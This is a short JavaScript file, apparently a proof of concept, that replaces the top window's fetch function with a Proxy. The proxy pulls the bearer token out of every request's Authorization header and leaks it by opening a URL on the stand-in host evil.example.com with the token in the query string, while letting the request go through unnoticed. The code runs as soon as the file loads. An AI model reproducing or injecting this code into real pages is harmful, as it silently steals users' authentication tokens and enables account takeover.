function install() {
  console.log('installing proxy…')
  window.top.fetch = new Proxy(window.top.fetch, {
    apply(actualFetch, that, args) {
    	console.log('intercepting fetch', args.at(0))
    	const authHeader = args?.at(1)?.headers?.get('authorization')
    	const token = authHeader?.split(' ').at(1)
    	if (token) {
    	  const evilUrl = `https://evil.example.com/?token=${token}`
    	  window.open(evilUrl, '_blank').focus();
    	}
  				
      const result = Reflect.apply(actualFetch, that, args);
      return result;
    }
  });
  console.log('installed fetch proxy in top window')
}

install()
